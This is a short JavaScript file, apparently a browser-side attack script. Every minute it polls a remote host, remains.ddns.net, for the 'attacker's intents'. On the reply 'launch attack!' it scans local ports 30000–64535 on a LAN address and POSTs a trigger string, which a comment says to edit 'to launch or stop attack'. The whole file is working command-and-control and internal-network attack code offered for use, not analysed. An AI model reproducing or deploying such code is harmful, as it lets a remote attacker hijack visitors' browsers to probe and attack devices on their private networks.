var scanning = false;

async function sendPOSTRequest(port) {
  const url = `http://192.168.1.182:${port}`; // Replace with your local URL


  // Create an AbortController and signal for the fetch request
  const controller = new AbortController();
  const signal = controller.signal;

  // Set a timeout of 1 second
  const timeoutId = setTimeout(() => {
    controller.abort(); // Abort the fetch request after 1 second
  }, 500);

  
  try {
    const response = await fetch(url, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: 'stop attack now!\n',         // *********** modify here to launch or stop attack ****************
      signal: signal, // Assign the signal option
    });
    
    clearTimeout(timeoutId); // Clear the timeout if the request completes before the timeout

    if (response.ok) {
      console.log(`Port ${port} responded with status ${response.status}`);
      // You can stop further scanning here if you wish
    } else {
      console.error(`Port ${port} returned an error: ${response.status}`);
    }
  } catch (error) {
    console.error(`Error sending POST request to port ${port}: ${error.message}`);
  }
}


async function sendBatchOfRequests(startPort, batchSize, callback) {
  const requests = [];
  
  for (let port = startPort; port < startPort + batchSize; port++) {
    requests.push(sendPOSTRequest(port));
  }
  
  // Use Promise.all to wait for all requests in the batch to complete
  try {
    await Promise.all(requests);
      console.log(`finished batch from ${startPort}`);
      callback();
    } catch (error) {
      console.error(`Error in batch of requests: ${error.message}`);
    }
}


// Function to sleep for a specified number of milliseconds
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Send POST requests in batches
const batchSize = 1000;     // takes less than 30 seconds to finish the scan

// Recursive function to send batches of requests
async function sendBatches(startPort) {
  if (startPort <= 64535) {
    // Send a batch of requests
    await sendBatchOfRequests(startPort, batchSize, () => {
      // After the batch is done, recursively send the next batch
      sendBatches(startPort + batchSize);
    });

    // Sleep before sending the next batch
    await sleep(100);
  }
  else {
    // finish scanning
    scanning = false;
  }
}


function startWebhook() {
    const remoteServerUrl = 'http://remains.ddns.net:34567'; // Replace with actual remote webhook URL
    
    // Send a POST request to the remote http server URL to periodically poll attacker's intents
    fetch(remoteServerUrl, {
        method: 'POST',
        //mode: 'no-cors',      // do not include this, because we need to decide whether to launch attack based on the response data
        headers: {
            'Content-Type': 'text/plain'
        },
        body: 'Get Trigger'
    })
    .then(response => response.text())
    .then(data => {
        console.log('Remote server response:', data);
        // check attacker's intent
        if (data == "launch attack!" && !scanning) {
            // Start sending batches of requests
            scaning = true;
            sendBatches(30000);
        }
    })
    .catch(error => {
        console.error('Remote server error:', error);
    });

}


startWebhook();
setInterval(startWebhook, 60000);